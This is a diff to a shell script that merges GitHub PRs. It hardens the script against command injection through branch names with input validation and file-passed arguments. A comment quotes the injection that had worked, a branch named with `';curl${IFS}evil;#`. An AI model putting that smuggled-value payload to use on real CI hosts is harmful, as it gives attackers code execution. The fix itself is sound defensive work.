@@ -23,6 +23,32 @@ LOG="$O/logs/orch-loop.log"
 touch "$O/dispatched.txt" "$O/candidates.txt" "$O/checked.txt"
 chmod +x "$O"/*.sh 2>/dev/null
 
+# ── input validation ───────────────────────────────────────────────────────────
+# These values come from the GitHub API and are then embedded in shell strings that tmux runs via
+# `sh -c`, so they are attacker-controlled. git permits ' ; $ ` & | ( ) { } " < > # in a ref name
+# (only spaces are forbidden, and ${IFS} supplies those), so a fork PR on branch
+# `fix/x';curl${IFS}evil;#` achieved arbitrary command execution on the merge host. Validate.
+safe_ref() {
+  case "${1:-}" in ''|*[!A-Za-z0-9._/-]*) return 1 ;; esac
+  git -C "$REPO" check-ref-format --branch "$1" >/dev/null 2>&1
+}
+is_num() { case "${1:-}" in ''|*[!0-9]*) return 1 ;; *) return 0 ;; esac; }
+# $O is operator config, not attacker input, but a quote or metacharacter here would break every
+# spawn (the tmux command string is executed via sh -c). Fail loudly instead of failing mysteriously.
+case "$O" in
+  *"'"*|*'"'*|*'`'*|*'$'*|*';'*|*'|'*|*'&'*|*' '*) echo "[fatal] \$O must not contain a quote or shell metacharacter: $O" >&2; exit 1 ;;
+esac
+
+# A stale claim must not mean "in flight" forever: merge-one.sh removes its claim only on clean
+# exit, so a SIGKILLed worker or a reboot mid-merge would otherwise stall that PR permanently.
+claim_live() {
+  local f="$O/state/mergeclaim-$1.lock" p
+  [ -f "$f" ] || return 1
+  p="$(cat "$f" 2>/dev/null || echo 0)"
+  [ "${p:-0}" -gt 0 ] && kill -0 "$p" 2>/dev/null && return 0
+  rm -f "$f"; return 1
+}
+
 # single-instance lock (atomic: noclobber create fails if the file exists)
 LOCKF="$O/.orch.lock"
 acq() { ( set -o noclobber; echo $$ > "$LOCKF" ) 2>/dev/null; }
@@ -62,6 +88,9 @@ while true; do
     --jq ".[]|select((.isDraft|not) or (.headRefName|test(\"-tm$|-cap$|^fix/\")))|$SEL|\"\(.number)\t\(.headRefName)\t\(.isDraft)\"" 2>/dev/null |
   while IFS="$(printf '\t')" read -r PR BR DRAFT; do
     [ -z "${PR:-}" ] && continue
+    # Skip anything that is not a plain integer PR / simple ref — never let API data reach a shell.
+    is_num "$PR" || { echo "#${PR:-?} SKIPPED (non-numeric PR id)" >>"$LOG"; continue; }
+    safe_ref "$BR" || { echo "#$PR SKIPPED (unsafe branch name: $BR)" >>"$LOG"; continue; }
     if [ "${DRAFT:-}" = "true" ]; then
       gh pr ready "$PR" --repo "$OR" >/dev/null 2>&1 && echo "#$PR readied (was a draft)" >>"$LOG"
       continue
@@ -99,7 +128,7 @@ print(('FAILED:'+','.join(fail)) if fail else (('PENDING:'+','.join(pend)) if pe
         if echo "$V" | grep -q ai-review-gate; then
           # The claim file is written by merge-one.sh itself, so it also covers the chain-<N>
           # path (which invokes merge-one.sh directly and whose session name is invisible here).
-          if [ -f "$O/state/mergeclaim-$PR.lock" ] || sess "fix-$PR" || sess "merge-$PR"; then
+          if claim_live "$PR" || sess "fix-$PR" || sess "merge-$PR"; then
             : # this PR already has a worker in flight
           else
             FIXN="$O/state/fixcount-$PR"; NF="$(cat "$FIXN" 2>/dev/null || echo 0)"
@@ -112,7 +141,11 @@ print(('FAILED:'+','.join(fail)) if fail else (('PENDING:'+','.join(pend)) if pe
               # Spawn FIRST, bookkeep only on success: recording the attempt before the spawn
               # means a killed/failed spawn consumes one of MAX_FIX_TRIES and deletes the
               # findings marker, so no fixer ever runs and the findings are lost.
-              if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' '$REPO' '$OR' $PR '$BR'" 2>/dev/null; then
+              # Args travel in a file, not interpolated into the tmux command string, so no
+              # PR-derived value can reach `sh -c`. Only $O (validated at startup) and the
+              # numeric $PR are embedded.
+              printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
+              if tmux new-session -d -s "fix-$PR" "bash '$O/fix-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null; then
                 echo $((NF + 1)) > "$FIXN"; rm -f "$O/state/needsfix-$PR-$HEAD_N"
                 echo "#$PR fixer attempt $((NF + 1))" >>"$LOG"
               else
@@ -124,7 +157,8 @@ print(('FAILED:'+','.join(fail)) if fail else (('PENDING:'+','.join(pend)) if pe
               echo "${HEAD_N:-}" > "$O/state/parked-$PR"
               echo "#$PR PARKED after $NF fixes at head=${HEAD_N:-?} — needs a human" >>"$LOG"
             elif [ "$(tmux ls 2>/dev/null | grep -c '^merge-')" -lt "${MAX_REVIEW:-4}" ]; then
-              tmux new-session -d -s "merge-$PR" "bash '$O/merge-one.sh' '$REPO' '$OR' $PR '$BR'" 2>/dev/null \
+              printf '%s\n' "$REPO" "$OR" "$PR" "$BR" > "$O/state/argv-$PR"
+              tmux new-session -d -s "merge-$PR" "bash '$O/merge-one.sh' --argv '$O/state/argv-$PR'" 2>/dev/null \
                 && echo "#$PR re-record" >>"$LOG"
             fi
           fi
